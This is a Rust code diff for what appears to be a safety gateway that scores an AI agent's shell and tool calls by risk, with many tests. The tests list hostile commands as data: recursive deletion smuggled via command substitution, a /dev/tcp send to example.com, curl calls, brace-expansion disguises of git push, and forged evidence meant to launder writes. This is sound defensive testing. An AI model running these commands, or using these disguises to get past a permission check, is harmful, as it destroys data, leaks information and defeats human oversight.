+        required_capability: None,
         semantic_request: None,
         ast_semantic_request: None,
+    }
+}
+
+fn invocation_fingerprint(tool_name: &str, arguments: &serde_json::Value) -> String {
+    // The random process namespace makes the exact invocation identity opaque
+    // outside this gateway lifetime. Approval is therefore one-shot and
+    // cannot survive a gateway restart without a fresh classifier decision.
+    static NAMESPACE: OnceLock<uuid::Uuid> = OnceLock::new();
+    let namespace = NAMESPACE.get_or_init(uuid::Uuid::new_v4);
+    let bytes = serde_json::to_vec(&(tool_name, arguments)).unwrap_or_default();
+    format!(
+        "invocation_v1_{}",
+        uuid::Uuid::new_v5(namespace, &bytes).as_simple()
+    )
+}
+
+fn assessment_with_capability(
+    risk: RiskBand,
+    exposure: ExposureBand,
+    source: &'static str,
+    required_capability: &'static str,
+) -> ShadowAssessment {
+    ShadowAssessment {
+        required_capability: Some(required_capability),
+        ..assessment(risk, exposure, source)
     }
 }
 
@@ -1759,23 +2304,23 @@ mod tests {
         assert_eq!(assess_shell("rg pattern src").risk, RiskBand::Low);
         assert_eq!(
             assess_shell("echo hi > out.txt"),
-            assessment(RiskBand::Moderate, ExposureBand::Local, "shell")
+            assessment_with_capability(RiskBand::Moderate, ExposureBand::Local, "shell", "Write",)
         );
         assert_eq!(
             assess_shell("cargo test >out.txt"),
-            assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell")
+            assessment_with_capability(RiskBand::Moderate, ExposureBand::Unknown, "shell", "Write",)
         );
         assert_eq!(
             assess_shell("(rm -rf /private/victim) >receipt.txt"),
-            assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell")
+            assessment_with_capability(RiskBand::Moderate, ExposureBand::Unknown, "shell", "Write",)
         );
         assert_eq!(
             assess_shell("/tmp/echo payload >receipt.txt"),
-            assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell")
+            assessment_with_capability(RiskBand::Moderate, ExposureBand::Unknown, "shell", "Write",)
         );
         assert_eq!(
             assess_shell("PS1='$(printf NESTED >&2)' echo \"${PS1@P}\" >receipt.txt"),
-            assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell")
+            assessment_with_capability(RiskBand::Moderate, ExposureBand::Unknown, "shell", "Write",)
         );
         for command in [
             "echo payload >/dev/tcp/example.com/443",
@@ -1783,7 +2328,12 @@ mod tests {
         ] {
             assert_eq!(
                 assess_shell(command),
-                assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell"),
+                assessment_with_capability(
+                    RiskBand::Moderate,
+                    ExposureBand::Unknown,
+                    "shell",
+                    "Write",
+                ),
                 "{command}"
             );
         }
@@ -1793,7 +2343,7 @@ mod tests {
         );
         assert_eq!(
             assess_shell("git worktree add /private/worktree main"),
-            assessment(RiskBand::Moderate, ExposureBand::Local, "shell")
+            assessment_with_capability(RiskBand::Moderate, ExposureBand::Local, "shell", "Write",)
         );
         assert_eq!(
             assess_shell("git worktree prune --expire now"),
@@ -1806,18 +2356,31 @@ mod tests {
         for command in [
             "git worktree add \"$(rm -rf /private/victim)\" main",
             "git worktree add \"$(curl https://example.invalid)\" main",
+            "git worktree add <(rm -rf /private/victim) main",
+        ] {
+            assert_eq!(
+                assess_shell(command),
+                assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell"),
+                "{command}"
+            );
+        }
+        for command in [
             "git worktree add \"$(rm -rf /private/victim)\" main >receipt.txt",
             "git worktree add /private/worktree main >\"$(rm -rf /private/victim)\"",
             "git p{u..u}sh origin main >receipt.txt",
             "git worktree rem{o..o}ve --force /private/worktree >receipt.txt",
-            "git worktree add <(rm -rf /private/victim) main",
             "git worktree add >(rm -rf /private/victim) main",
             "cp <(rm -rf /private/victim) output.txt",
             "echo \"$(rm -rf /private/victim)\" >output.txt",
         ] {
             assert_eq!(
                 assess_shell(command),
-                assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell"),
+                assessment_with_capability(
+                    RiskBand::Moderate,
+                    ExposureBand::Unknown,
+                    "shell",
+                    "Write",
+                ),
                 "{command}"
             );
         }
@@ -1857,6 +2420,39 @@ mod tests {
         assert_eq!(
             assess_shell("git branch --all --no-color"),
             assessment(RiskBand::Low, ExposureBand::Local, "shell")
+        );
+        assert_eq!(
+            assess_shell("git -C /Users/ben/dev/anytype-heart status --short --branch"),
+            assessment(RiskBand::Low, ExposureBand::Local, "shell")
+        );
+        assert_eq!(
+            assess_shell("git init /Users/ben/dev/panoply"),
+            assessment_with_capability(RiskBand::Moderate, ExposureBand::Local, "shell", "Write",)
+        );
+        assert_eq!(
+            assess_shell("git init -b main /Users/ben/dev/panoply"),
+            assessment_with_capability(RiskBand::Moderate, ExposureBand::Local, "shell", "Write",)
+        );
+        assert_eq!(
+            assess_shell(
+                "git add -- docs/research/001-anytype.md docs/adr/0002-boundary.md fixtures/compatibility/cases.json"
+            ),
+            assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell")
+        );
+        assert_eq!(
+            assess_shell(
+                "statewright-git-closeout --message 'docs: record compatibility boundary' -- docs/research/001-anytype.md"
+            ),
+            assessment_with_capability(
+                RiskBand::Moderate,
+                ExposureBand::Local,
+                "shell",
+                "GitLocalWrite"
+            )
+        );
+        assert_eq!(
+            assess_shell("statewright-git-closeout --message test -- ../secret"),
+            assessment_with_capability(RiskBand::Moderate, ExposureBand::Local, "shell", "Write",)
         );
         assert_eq!(
             assess_shell("touch output.txt"),
@@ -1929,6 +2525,319 @@ mod tests {
     }
 
     #[test]
+    fn native_command_evidence_resolves_units_without_losing_effects_or_identity() {
+        set_test_shell_ast_authority_enabled(Some(true));
+        let command = "task test:unit";
+        let input = json!({"cmd": command, "workdir":"/workspace"});
+        let base = || {
+            let deterministic = assess_invocation(None, "exec_command", &input, Some("validate"));
+            let request = deterministic.semantic_request.as_ref().unwrap().clone();
+            pipeline_from_parts(
+                deterministic,
+                semantic_receipt(&request, SemanticAssessorStatus::Disabled),
+                true,
+            )
+        };
+        let proof = |units: Vec<serde_json::Value>| {
+            json!({
+                "schema":"statewright/local-command-evidence/v1", "tool_name":"exec_command",
+                "command":command, "requested_cwd":"/workspace", "cwd":"/workspace",
+                "invocation":bash_classifier::literal_invocation(command).unwrap(),
+                "collected_at_ms":chrono::Utc::now().timestamp_millis(), "complete":true,
+                "files":[{"path":"Taskfile.yml","sha256":"a".repeat(64)}], "commands":units,
+            })
+        };
+        let evidence_unit = |original: &str, resolved: &str| {
+            json!({
+                "original":original, "resolved":resolved, "cwd":".",
+                "invocation":bash_classifier::literal_invocation(original),
+            })
+        };
+        let unit = evidence_unit(
+            "npx vitest run tests/a.spec.js",
+            "node_modules/.bin/vitest run tests/a.spec.js",
+        );
+        assert_eq!(base().resolve_effect(), ResolvedEffect::DenyUncertain);
+        let original_fingerprint = base().deterministic.invocation_fingerprint;
+        let valid = proof(vec![unit.clone()]);
+        let admitted =
+            apply_native_command_evidence(base(), None, "exec_command", &input, Some(&valid));
+        assert_eq!(
+            admitted.resolve_effect(),
+            ResolvedEffect::BoundedLocalExecution
+        );
+        assert_eq!(
+            admitted.deterministic.required_capability,
+            Some("BoundedLocalExecution")
+        );
+        assert_eq!(
+            admitted.deterministic.invocation_fingerprint,
+            original_fingerprint
+        );
+        assert!(!admitted.visible_json().to_string().contains("/workspace"));
+        assert!(
+            !serde_json::to_string(admitted.deterministic.semantic_request.as_ref().unwrap())
+                .unwrap()
+                .contains("tests/a.spec.js")
+        );
+
+        for (nested, expected) in [
+            (
+                "echo x > output.txt",
+                ResolvedEffect::LocalWriteAndBoundedLocalExecution,
+            ),
+            (
+                "curl https://example.invalid",
+                ResolvedEffect::DenyKnownRisk,
+            ),
+            ("rm -rf output", ResolvedEffect::DenyKnownRisk),
+            ("unknown-runner x", ResolvedEffect::DenyUncertain),
+        ] {
+            let p = proof(vec![unit.clone(), evidence_unit(nested, nested)]);
+            assert_eq!(
+                apply_native_command_evidence(base(), None, "exec_command", &input, Some(&p))
+                    .resolve_effect(),
+                expected,
+                "{nested}"
+            );
+        }
+        for (key, value) in [
+            ("command", json!("task other")),
+            ("tool_name", json!("Bash")),
+            ("requested_cwd", json!("/other")),
+            ("cwd", json!("relative")),
+            ("collected_at_ms", json!(0)),
+            ("complete", json!(false)),
+            ("schema", json!("statewright/local-command-evidence/v2")),
+            ("commands", json!([])),
+            ("files", json!([])),
+        ] {
+            let mut p = valid.clone();
+            p[key] = value;
+            assert_eq!(
+                apply_native_command_evidence(base(), None, "exec_command", &input, Some(&p))
+                    .resolve_effect(),
+                ResolvedEffect::DenyUncertain,
+                "{key}"
+            );
+        }
+        let forged_rewrite = proof(vec![evidence_unit(
+            "curl https://example.invalid",
+            "node_modules/.bin/vitest run",
+        )]);
+        assert_eq!(
+            apply_native_command_evidence(
+                base(),
+                None,
+                "exec_command",
+                &input,
+                Some(&forged_rewrite)
+            )
+            .resolve_effect(),
+            ResolvedEffect::DenyUncertain
+        );
+        let registered: ToolInfo =
+            serde_json::from_value(json!({"name":"exec_command","inputSchema":{}})).unwrap();
+        assert_eq!(
+            apply_native_command_evidence(
+                base(),
+                Some(&registered),
+                "exec_command",
+                &input,
+                Some(&valid)
+            )
+            .resolve_effect(),
+            ResolvedEffect::DenyUncertain
+        );
+        // Supplying a look-alike field through ordinary tool arguments cannot
+        // enter the native evidence path.
+        let spoofed = json!({"cmd":command,"workdir":"/workspace","command_evidence":valid});
+        assert_eq!(
+            assess_invocation(None, "exec_command", &spoofed, None).exposure,
+            ExposureBand::Unknown
+        );
+        set_test_shell_ast_authority_enabled(None);
+    }
+
+    #[test]
+    fn native_package_build_evidence_admits_only_literal_vite_build() {
+        set_test_shell_ast_authority_enabled(Some(true));
+        let command = "npm run build";
+        let input = json!({"cmd": command, "workdir":"/workspace"});
+        let base = || {
+            let deterministic = assess_invocation(None, "exec_command", &input, Some("validate"));
+            let request = deterministic.semantic_request.as_ref().unwrap().clone();
+            pipeline_from_parts(
+                deterministic,
+                semantic_receipt(&request, SemanticAssessorStatus::Disabled),
+                true,
+            )
+        };
+        let proof = |resolved: &str| {
+            json!({
+                "schema":"statewright/local-command-evidence/v1", "tool_name":"exec_command",
+                "command":command, "requested_cwd":"/workspace", "cwd":"/workspace",
+                "invocation":bash_classifier::literal_invocation(command).unwrap(),
+                "collected_at_ms":chrono::Utc::now().timestamp_millis(), "complete":true,
+                "files":[{"path":"package.json","sha256":"a".repeat(64)}],
+                "commands":[{"original":resolved,"resolved":resolved,"cwd":".",
+                    "invocation":bash_classifier::literal_invocation(resolved)}],
+            })
+        };
+
+        let admitted = proof("vite build");
+        assert_eq!(
+            apply_native_command_evidence(base(), None, "exec_command", &input, Some(&admitted))
+                .resolve_effect(),
+            ResolvedEffect::BoundedLocalExecution
+        );
+        for denied in [
+            "vite build --watch",
+            "vite build --config outside.js",
+            "vite build --outDir ../outside",
+        ] {
+            let evidence = proof(denied);
+            assert_eq!(
+                apply_native_command_evidence(
+                    base(),
+                    None,
+                    "exec_command",
+                    &input,
+                    Some(&evidence)
+                )
+                .resolve_effect(),
+                ResolvedEffect::DenyUncertain,
+                "{denied}"
+            );
+        }
+        set_test_shell_ast_authority_enabled(None);
+    }
+
+    #[test]
+    fn native_task_directory_evidence_binds_effective_unit_cwd() {
+        set_test_shell_ast_authority_enabled(Some(true));
+        let command = "task -d site test:unit";
+        let input = json!({"cmd":command,"workdir":"/workspace"});
+        let base = || {
+            let deterministic = assess_invocation(None, "exec_command", &input, Some("validate"));
+            let request = deterministic.semantic_request.as_ref().unwrap().clone();
+            pipeline_from_parts(
+                deterministic,
+                semantic_receipt(&request, SemanticAssessorStatus::Disabled),
+                true,
+            )
+        };
+        let evidence = json!({
+            "schema":"statewright/local-command-evidence/v1", "tool_name":"exec_command",
+            "command":command, "requested_cwd":"/workspace", "cwd":"/workspace",
+            "invocation":bash_classifier::literal_invocation(command).unwrap(),
+            "collected_at_ms":chrono::Utc::now().timestamp_millis(), "complete":true,
+            "files":[{"path":"site/Taskfile.yml","sha256":"a".repeat(64)}],
+            "commands":[{
+                "original":"node --test tests/a.test.mjs",
+                "resolved":"node --test tests/a.test.mjs",
+                "cwd":"site",
+                "invocation":bash_classifier::literal_invocation("node --test tests/a.test.mjs"),
+            }],
+        });
+        assert_eq!(
+            apply_native_command_evidence(base(), None, "exec_command", &input, Some(&evidence))
+                .resolve_effect(),
+            ResolvedEffect::BoundedLocalExecution
+        );
+        for unit_cwd in ["../site", "/workspace/site", "site/../other"] {
+            let mut invalid = evidence.clone();
+            invalid["commands"][0]["cwd"] = json!(unit_cwd);
+            assert_eq!(
+                apply_native_command_evidence(base(), None, "exec_command", &input, Some(&invalid))
+                    .resolve_effect(),
+                ResolvedEffect::DenyUncertain,
+                "{unit_cwd}"
+            );
+        }
+        set_test_shell_ast_authority_enabled(None);
+    }
+
+    #[test]
+    fn native_node_entrypoint_evidence_binds_invocation_cwd_environment_and_bytes() {
+        set_test_shell_ast_authority_enabled(Some(true));
+        let command = "STATEWRIGHT_DIR=/workspace/statewright command -- node site/scripts/preflight.mjs preflight";
+        let input = json!({"cmd":command,"workdir":"/workspace"});
+        let base = || {
+            let deterministic = assess_invocation(None, "exec_command", &input, Some("validate"));
+            let request = deterministic.semantic_request.as_ref().unwrap().clone();
+            pipeline_from_parts(
+                deterministic,
+                semantic_receipt(&request, SemanticAssessorStatus::Disabled),
+                true,
+            )
+        };
+        assert_eq!(base().resolve_effect(), ResolvedEffect::DenyUncertain);
+        let evidence = json!({
+            "schema":"statewright/local-command-evidence/v1", "tool_name":"exec_command",
+            "command":command, "requested_cwd":"/workspace", "cwd":"/workspace",
+            "invocation":bash_classifier::literal_invocation(command).unwrap(),
+            "collected_at_ms":chrono::Utc::now().timestamp_millis(), "complete":true,
+            "files":[{"path":"site/scripts/preflight.mjs","sha256":"a".repeat(64)}],
+            "commands":[{"original":command,"resolved":command,"cwd":".",
+                "invocation":bash_classifier::literal_invocation(command)}],
+        });
+        let admitted =
+            apply_native_command_evidence(base(), None, "exec_command", &input, Some(&evidence));
+        assert_eq!(
+            admitted.resolve_effect(),
+            ResolvedEffect::BoundedLocalExecution
+        );
+        assert_eq!(admitted.deterministic.source, "native_command_evidence");
+
+        for mutation in ["files", "invocation", "commands"] {
+            let mut invalid = evidence.clone();
+            match mutation {
+                "files" => {
+                    invalid["files"] =
+                        json!([{"path":"site/scripts/other.mjs","sha256":"a".repeat(64)}])
+                }
+                "invocation" => invalid["invocation"]["environment_names"] = json!([]),
+                "commands" => invalid["commands"][0]["cwd"] = json!("site"),
+                _ => unreachable!(),
+            }
+            assert_eq!(
+                apply_native_command_evidence(base(), None, "exec_command", &input, Some(&invalid))
+                    .resolve_effect(),
+                ResolvedEffect::DenyUncertain,
+                "{mutation}"
+            );
+        }
+        set_test_shell_ast_authority_enabled(None);
+    }
+
+    #[test]
+    fn agent_delegation_is_known_transitive_authority() {
+        for tool_name in [
+            "mcp__collaboration__spawn_agent",
+            "mcp__agents__spawn_agent",
+            "mcp__statewright_helpers__spawn_agent",
+            "mcp__statewright_helpers__SPAWN_AGENT",
+            "collaborationspawn_agent",
+            "functions.collaboration.spawn_agent",
+            "Agent",
+        ] {
+            assert_eq!(
+                assess_mcp(None, tool_name),
+                assessment(
+                    RiskBand::High,
+                    ExposureBand::Unknown,
+                    "unmanaged_agent_delegation"
+                )
+            );
+        }
+        assert_eq!(
+            assess_mcp(None, "statewright_run_agent").source,
+            "mcp_unknown"
+        );
+    }
+
+    #[test]
     fn invocation_uses_shell_text_once_and_carries_state_intent() {
         let assessment = assess_invocation(
             None,
@@ -1975,27 +2884,23 @@ mod tests {
 
         for native in [
             "Write",
+            "write",
             "Edit",
+            "edit",
             "MultiEdit",
+            "multiedit",
             "apply_patch",
+            "functions.apply_patch",
+            "StrReplace",
+            "str_replace",
             "write_file",
             "edit_file",
             "patch_file",
             "create_file",
             "create_or_update_file",
         ] {
-            let annotated: ToolInfo = serde_json::from_value(json!({
-                "name":native,
-                "inputSchema":{},
-                "annotations":{
-                    "readOnlyHint":false,
-                    "destructiveHint":true,
-                    "openWorldHint":true
-                }
-            }))
-            .unwrap();
             let assessed = assess_invocation_with_origin(
-                Some(&annotated),
+                None,
                 native,
                 &json!({"patch":"redacted"}),
                 Some("implement"),
@@ -2005,6 +2910,118 @@ mod tests {
             assert_eq!(assessed.exposure, ExposureBand::Local, "{native}");
             assert_eq!(assessed.source, "native_write", "{native}");
         }
+
+        let freeform_patch = assess_invocation_with_origin(
+            None,
+            "apply_patch",
+            &json!({"command":"*** Begin Patch\n*** Update File: src/lib.rs\n*** End Patch"}),
+            Some("implement"),
+            true,
+        );
+        assert_eq!(freeform_patch.risk, RiskBand::Moderate);
+        assert_eq!(freeform_patch.exposure, ExposureBand::Local);
+        assert_eq!(freeform_patch.source, "native_write");
+
+        let registered_collision = assess_invocation_with_origin(
+            Some(&upstream_collision),
+            "apply_patch",
+            &json!({"patch":"redacted"}),
+            Some("implement"),
+            true,
+        );
+        assert_eq!(registered_collision.risk, RiskBand::Critical);
+        assert_eq!(registered_collision.exposure, ExposureBand::Account);
+        assert_ne!(registered_collision.source, "native_write");
+    }
+
+    #[tokio::test]
+    async fn trusted_native_freeform_patch_pipeline_resolves_as_local_write() {
+        let config =
+            SemanticShadowConfig::from_values(Some("staging"), Some("true"), Some("true"), None);
+        let pipeline = assess_pipeline_visible_with_runtime(
+            None,
+            "apply_patch",
+            &json!({"command":"*** Begin Patch\n*** Update File: src/lib.rs\n*** End Patch"}),
+            Some("implement"),
+            true,
+            &config,
+            None,
+            std::time::Duration::ZERO,
+        )
+        .await;
+
+        assert_eq!(pipeline.deterministic.source, "native_write");
+        assert_eq!(pipeline.deterministic.risk, RiskBand::Moderate);
+        assert_eq!(pipeline.deterministic.exposure, ExposureBand::Local);
+        assert_eq!(pipeline.effective_risk, RiskBand::Moderate);
+        assert_eq!(pipeline.resolve_effect(), ResolvedEffect::LocalWrite);
+    }
+
+    #[tokio::test]
+    async fn trusted_git_closeout_pipeline_preserves_its_narrow_capability() {
+        let config =
+            SemanticShadowConfig::from_values(Some("staging"), Some("true"), Some("true"), None);
+        let command = "statewright-git-closeout --message 'docs: bounded closeout' -- docs/one.md";
+
+        for ast_authoritative in [false, true] {
+            set_test_shell_ast_shadow_enabled(Some(ast_authoritative));
+            set_test_shell_ast_authority_enabled(Some(ast_authoritative));
+            let pipeline = assess_pipeline_visible_with_runtime(
+                None,
+                "exec_command",
+                &json!({"cmd": command}),
+                Some("commit"),
+                true,
+                &config,
+                None,
+                std::time::Duration::ZERO,
+            )
+            .await;
+
+            assert_eq!(pipeline.deterministic.risk, RiskBand::Moderate);
+            assert_eq!(pipeline.deterministic.exposure, ExposureBand::Local);
+            assert_eq!(pipeline.resolve_effect(), ResolvedEffect::GitLocalWrite);
+            assert_eq!(
+                pipeline.visible_json()["required_authority"],
+                "GitLocalWrite"
+            );
+        }
+        set_test_shell_ast_shadow_enabled(None);
+        set_test_shell_ast_authority_enabled(None);
+    }
+
+    #[tokio::test]
+    async fn trusted_git_closeout_cannot_launder_compound_writes() {
+        let config =
+            SemanticShadowConfig::from_values(Some("staging"), Some("true"), Some("true"), None);
+        for command in [
+            "statewright-git-closeout --message test -- docs/one.md && mkdir escaped",
+            "statewright-git-closeout --message test -- docs/one.md > receipt",
+        ] {
+            for ast_authoritative in [false, true] {
+                set_test_shell_ast_shadow_enabled(Some(ast_authoritative));
+                set_test_shell_ast_authority_enabled(Some(ast_authoritative));
+                let pipeline = assess_pipeline_visible_with_runtime(
+                    None,
+                    "exec_command",
+                    &json!({"cmd": command}),
+                    Some("commit"),
+                    true,
+                    &config,
+                    None,
+                    std::time::Duration::ZERO,
+                )
+                .await;
+
+                assert_ne!(
+                    pipeline.resolve_effect(),
+                    ResolvedEffect::GitLocalWrite,
+                    "compound command must not inherit GitLocalWrite: {command}"
+                );
+            }
+        }
+        set_test_shell_ast_shadow_enabled(None);
+        set_test_shell_ast_authority_enabled(None);
     }
 
     #[test]
@@ -2726,6 +3743,8 @@ mod tests {
 
     #[tokio::test]
     async fn semantic_dispatcher_uses_explicit_staging_config_and_bounded_worker() {
+        use axum::{Router, http::StatusCode, routing::post};
+
         let request = semantic_request(
             None,
             "read_file",
@@ -2741,25 +3760,33 @@ mod tests {
         let enabled =
             SemanticShadowConfig::from_values(Some("staging"), Some("true"), None, Some("1"));
         let (receipt_sender, mut receipt_receiver) = mpsc::channel(1);
+        // Use a deterministic loopback 503 rather than an assumed-unused port.
+        // On some hosts a refused connection can consume most of the client
+        // deadline under concurrent tests, which made the worker assertion
+        // spuriously fail without exercising a different product behavior.
+        let app = Router::new().route(
+            "/chat/completions",
+            post(|| async { StatusCode::SERVICE_UNAVAILABLE }),
+        );
+        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let endpoint = format!("http://{}", listener.local_addr().unwrap());
+        tokio::spawn(async move {
+            axum::serve(listener, app).await.unwrap();
+        });
         let provider = SemanticProviderConfig {
             kind: SemanticProviderKind::OpenAiCompatible,
-            endpoint: "http://127.0.0.1:1".into(),
+            endpoint,
             model: "test".into(),
             bearer_token: None,
-            timeout: std::time::Duration::from_millis(50),
+            timeout: std::time::Duration::from_secs(1),
         };
         let runtime = start_semantic_shadow_runtime(&enabled, receipt_sender, provider);
         assert!(dispatch_semantic_shadow(&enabled, Some(&runtime), &request).is_none());
-        let receipt = tokio::time::timeout(
-            // The provider deadline remains 50ms; leave scheduler slack so
-            // this test verifies bounded completion without assuming an idle
-            // shared test runtime.
-            std::time::Duration::from_millis(500),
-            receipt_receiver.recv(),
-        )
-        .await
-        .expect("bounded worker should emit promptly")
-        .expect("bounded receipt sender should remain open");
+        let receipt =
+            tokio::time::timeout(std::time::Duration::from_secs(1), receipt_receiver.recv())
+                .await
+                .expect("bounded worker should emit promptly")
+                .expect("bounded receipt sender should remain open");
         assert_eq!(receipt.status, SemanticAssessorStatus::Unavailable);
         assert!(receipt.vector.is_none());
     }
@@ -2952,6 +3979,11 @@ mod tests {
         for (command, expected_risk, expected_exposure) in [
             (
                 "git add plugins/executor/lib/workflow-preamble.mjs plugins/executor/lib/host-adapters.mjs plugins/executor/lib/managed-client-supervisor.mjs plugins/executor/tests/host-adapters.test.mjs plugins/executor/tests/managed-client-supervisor.test.mjs",
+                RiskBand::Moderate,
+                ExposureBand::Unknown,
+            ),
+            (
+                "git add -- plugins/executor/lib/workflow-preamble.mjs plugins/executor/lib/host-adapters.mjs plugins/executor/lib/managed-client-supervisor.mjs plugins/executor/tests/host-adapters.test.mjs plugins/executor/tests/managed-client-supervisor.test.mjs",
                 RiskBand::Moderate,
                 ExposureBand::Unknown,
             ),
@@ -3225,11 +4257,76 @@ mod tests {
             missing_shape.resolve_effect(),
             ResolvedEffect::DenyUncertain
         );
+        let visible = missing_shape.visible_json();
+        assert_eq!(visible["resolved_effect"], "deny_uncertain");
+        assert_eq!(
+            visible["resolution_basis"],
+            "incomplete_structural_evidence"
+        );
+        assert_eq!(
+            visible["required_authority"],
+            "complete_structural_evidence_or_separate_approval"
+        );
+        assert_eq!(visible["equivalent_retry_allowed"], true);
+        assert_eq!(visible["reformulation_allowed"], true);
+        assert_eq!(visible["exact_invocation_retry_allowed"], false);
+        assert_eq!(visible["separate_approval_allowed"], false);
+        for basis in [
+            "semantic_threshold_not_met",
+            "incomplete_structural_evidence",
+            "semantic_vector_unavailable",
+            "semantic_assessment_incomplete",
+            "semantic_authorization_disabled",
+        ] {
+            let semantic_denial = missing_shape.visible_json_for_denial(
+                basis,
+                "complete_structural_evidence_or_separate_approval",
+            );
+            assert_eq!(semantic_denial["equivalent_retry_allowed"], true, "{basis}");
+            assert_eq!(semantic_denial["reformulation_allowed"], true, "{basis}");
+            assert_eq!(
+                semantic_denial["exact_invocation_retry_allowed"], false,
+                "{basis}"
+            );
+            assert_eq!(
+                semantic_denial["separate_approval_allowed"], true,
+                "{basis}"
+            );
+        }
+        let wrong_authority = missing_shape
+            .visible_json_for_denial("semantic_threshold_not_met", "BoundedLocalExecution");
+        assert_eq!(wrong_authority["reformulation_allowed"], true);
+        assert_eq!(wrong_authority["separate_approval_allowed"], false);
+        let capability_denial =
+            missing_shape.visible_json_for_denial("workflow_capability_read_denied", "Read");
+        assert_eq!(capability_denial["equivalent_retry_allowed"], false);
+        assert_eq!(capability_denial["reformulation_allowed"], false);
+        assert_eq!(capability_denial["exact_invocation_retry_allowed"], false);
+        assert_eq!(capability_denial["separate_approval_allowed"], false);
+        let classifier_policy_denial = missing_shape
+            .visible_json_for_denial("classifier_policy_low_local", "BoundedLocalExecution");
+        assert_eq!(classifier_policy_denial["reformulation_allowed"], false);
+        assert_eq!(
+            classifier_policy_denial["exact_invocation_retry_allowed"],
+            false
+        );
+        assert_eq!(classifier_policy_denial["separate_approval_allowed"], false);
+        let known_risk = external_pipeline
+            .visible_json_for_denial("effective_known_risk", "separate_approved_execution_path");
+        assert_eq!(known_risk["equivalent_retry_allowed"], false);
+        assert_eq!(known_risk["reformulation_allowed"], false);
+        assert_eq!(known_risk["exact_invocation_retry_allowed"], false);
+        assert_eq!(known_risk["separate_approval_allowed"], false);
+        assert!(
+            visible["intent_fingerprint"]
+                .as_str()
+                .is_some_and(|value| value.starts_with("intent_v1_"))
+        );
+        assert!(!visible.to_string().contains("secret-helper"));
 
         for command in [
             "task test",
             "npm run inspect",
-            "npm test",
             "npm build",
             "pnpm lint",
             "cargo run -- inspect",
@@ -3398,6 +4495,7 @@ mod tests {
             "if git rev-parse HEAD; then tmux capture-pane -p -t %36 | tail -80; fi",
             "(pwd; git status --short)",
             "git rev-parse HEAD && rg needle crates | head -20",
+            "nl -ba src/components/BookingWizard.vue | sed -n '485,525p'; nl -ba src/components/__tests__/BookingWizard.checkout.spec.js | sed -n '445,530p'; nl -ba docs/milestones/2026-10-02-checkout-durable-outcome.md | sed -n '28,46p'",
             "case inspect in inspect) git status --short;; esac",
             "for reference in HEAD main; do git rev-parse \"$reference\"; done",
         ] {
@@ -3411,6 +4509,15 @@ mod tests {
             assert_eq!(assessed.risk, RiskBand::Low, "{command}");
             assert_eq!(assessed.exposure, ExposureBand::Local, "{command}");
         }
+        let status = assess_invocation(
+            None,
+            "exec_command",
+            &json!({"cmd":"git status --short"}),
+            Some("inspect"),
+        );
+        assert_eq!(status.source, "shell_ast");
+        assert_eq!(status.risk, RiskBand::Low);
+        assert_eq!(status.exposure, ExposureBand::Local);
         for (command, risk) in [
             ("git status --short && git push origin HEAD", RiskBand::High),
             ("printf '%s\\n' \"$(git push origin HEAD)\"", RiskBand::High),
@@ -3445,6 +4552,371 @@ mod tests {
         assert_eq!(data.source, "shell_ast");
         assert_eq!(data.risk, RiskBand::Moderate);
         assert_eq!(data.exposure, ExposureBand::Local);
+        let mkdir = assess_invocation(
+            None,
+            "exec_command",
+            &json!({"cmd":"mkdir -p docs/plans"}),
+            Some("implement"),
+        );
+        assert_eq!(mkdir.source, "shell_ast");
+        assert_eq!(mkdir.risk, RiskBand::Moderate);
+        assert_eq!(mkdir.exposure, ExposureBand::Local);
+        let git_add = assess_invocation(
+            None,
+            "exec_command",
+            &json!({"cmd":"git add -- docs/research/001-anytype.md docs/adr/0002-boundary.md fixtures/compatibility/cases.json"}),
+            Some("implement"),
+        );
+        assert_eq!(git_add.source, "shell_ast");
+        assert_eq!(git_add.risk, RiskBand::Moderate);
+        assert_eq!(git_add.exposure, ExposureBand::Unknown);
+        set_test_shell_ast_shadow_enabled(None);
+        set_test_shell_ast_authority_enabled(None);
+    }
+
+    #[test]
+    fn shell_ast_authority_aggregates_compound_local_effects_without_exact_class_matches() {
+        set_test_shell_ast_shadow_enabled(Some(false));
+        set_test_shell_ast_authority_enabled(Some(true));
+
+        let resolved = |command: &str| {
+            let deterministic = assess_invocation(
+                None,
+                "exec_command",
+                &json!({"cmd": command}),
+                Some("implement"),
+            );
+            let request = deterministic.semantic_request.as_ref().unwrap().clone();
+            pipeline_from_parts(
+                deterministic,
+                semantic_receipt(&request, SemanticAssessorStatus::Disabled),
+                true,
+            )
+            .resolve_effect()
+        };
+
+        assert_eq!(
+            resolved(
+                "git rev-parse HEAD && git worktree add -b fix/structural .agent-worktrees/structural HEAD"
+            ),
+            ResolvedEffect::LocalWrite
+        );
+        assert_eq!(
+            resolved(
+                "printf receipt > receipt.txt && statewright-git-closeout --message test -- docs/receipt.md"
+            ),
+            ResolvedEffect::LocalWriteAndGitLocalWrite
+        );
+        assert_eq!(
+            resolved("npm test && git status --short"),
+            ResolvedEffect::BoundedLocalExecution
+        );
+        assert_eq!(
+            resolved("npm test && mkdir output"),
+            ResolvedEffect::LocalWriteAndBoundedLocalExecution
+        );
+        assert_eq!(
+            resolved("npm test && statewright-git-closeout --message test -- docs/receipt.md"),
+            ResolvedEffect::BoundedLocalExecutionAndGitLocalWrite
+        );
+        assert_eq!(
+            resolved(
+                "npm test && mkdir output && statewright-git-closeout --message test -- docs/receipt.md"
+            ),
+            ResolvedEffect::LocalWriteAndBoundedLocalExecutionAndGitLocalWrite
+        );
+        assert_eq!(
+            resolved("npm test && curl https://example.invalid"),
+            ResolvedEffect::DenyKnownRisk
+        );
+
+        set_test_shell_ast_shadow_enabled(None);
+        set_test_shell_ast_authority_enabled(None);
+    }
+
+    #[test]
+    fn shell_ast_authority_resolves_version_probes_and_bounded_validation() {
+        set_test_shell_ast_shadow_enabled(Some(false));
+        set_test_shell_ast_authority_enabled(Some(true));
+
+        let resolved = |command: &str| {
+            let deterministic = assess_invocation(
+                None,
+                "exec_command",
+                &json!({"cmd": command}),
+                Some("validate"),
+            );
+            let request = deterministic.semantic_request.as_ref().unwrap().clone();
+            pipeline_from_parts(
+                deterministic,
+                semantic_receipt(&request, SemanticAssessorStatus::Disabled),
+                true,
+            )
+            .resolve_effect()
+        };
+
